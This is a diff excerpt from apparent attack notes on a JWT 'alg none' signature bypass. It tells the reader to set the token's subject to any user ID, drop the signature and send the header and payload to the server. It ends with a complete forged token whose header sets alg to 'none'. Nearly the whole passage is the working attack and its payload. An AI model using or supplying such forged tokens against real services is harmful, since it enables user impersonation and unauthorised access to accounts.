@@ -16,7 +16,7 @@ JWT payload(change into aything you want e.g sub = userid )
 eyJhdWQiOiI2IiwianRpIjoiZmI2MjM2ZTRkYjUyMDc3YzMwMDNhM2U2MzY1Yzk3ZTMwNzdiNDVlZDYyNjI5OTBlZGJkYTVjMjJkNGNlM2MxY2RjMGUzMWE4ODQxMWNiMGIiLCJpYXQiOjE3MTE0NDI5NDIsIm5iZiI6MTcxMTQ0Mjk0MiwiZXhwIjoxNzQyOTc4OTQyLCJzdWIiOiI2NDUwOTQiLCJzY29wZXMiOltdfQ==.
 
 
-Final cracking combine JWT header and payload together and send to the server (conjucting with . (dot))
-----------------------------------------------------------------------------------------------------------
+Final cracking combine JWT header and payload together and send to the server ( without signature; conjucting with . (dot))
+----------------------------------------------------------------------------------------------------------------------------
 
 "token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIiwianRpIjoiZmI2MjM2ZTRkYjUyMDc3YzMwMDNhM2U2MzY1Yzk3ZTMwNzdiNDVlZDYyNjI5OTBlZGJkYTVjMjJkNGNlM2MxY2RjMGUzMWE4ODQxMWNiMGIifQ==.eyJhdWQiOiI2IiwianRpIjoiZmI2MjM2ZTRkYjUyMDc3YzMwMDNhM2U2MzY1Yzk3ZTMwNzdiNDVlZDYyNjI5OTBlZGJkYTVjMjJkNGNlM2MxY2RjMGUzMWE4ODQxMWNiMGIiLCJpYXQiOjE3MTE0NDI5NDIsIm5iZiI6MTcxMTQ0Mjk0MiwiZXhwIjoxNzQyOTc4OTQyLCJzdWIiOiI2NDUwOTQiLCJzY29wZXMiOltdfQ==."
